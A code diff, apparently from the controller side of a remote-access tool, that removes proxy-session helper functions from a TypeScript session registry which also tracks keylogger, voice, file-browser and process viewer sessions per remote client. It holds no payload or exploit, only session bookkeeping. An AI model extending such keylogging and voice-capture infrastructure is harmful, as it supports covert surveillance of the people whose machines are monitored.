@@ -21,7 +21,6 @@ const fileBrowserSessions = new Map<string, FileBrowserViewer>();
 const processSessions = new Map<string, ProcessViewer>();
 const notificationSessions = new Map<string, NotificationsViewer>();
 const keyloggerSessions = new Map<string, KeyloggerViewer>();
-const proxySessions = new Map<string, KeyloggerViewer>(); // Reusing KeyloggerViewer interface for consistency
 const voiceSessions = new Map<string, VoiceViewer>();
 
 function addSessionToClientIndex(
@@ -351,32 +350,6 @@ export function getKeyloggerSessionsByClient(
 
 export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
   return keyloggerSessions;
-}
-
-export function addProxySession(session: KeyloggerViewer): void {
-  proxySessions.set(session.id, session);
-}
-
-export function getProxySession(
-  sessionId: string,
-): KeyloggerViewer | undefined {
-  return proxySessions.get(sessionId);
-}
-
-export function deleteProxySession(sessionId: string): boolean {
-  return proxySessions.delete(sessionId);
-}
-
-export function getProxySessionsByClient(
-  clientId: string,
-): KeyloggerViewer[] {
-  return Array.from(proxySessions.values()).filter(
-    (s) => s.clientId === clientId,
-  );
-}
-
-export function getAllProxySessions(): Map<string, KeyloggerViewer> {
-  return proxySessions;
 }
 
 export function addVoiceSession(session: VoiceViewer): void {
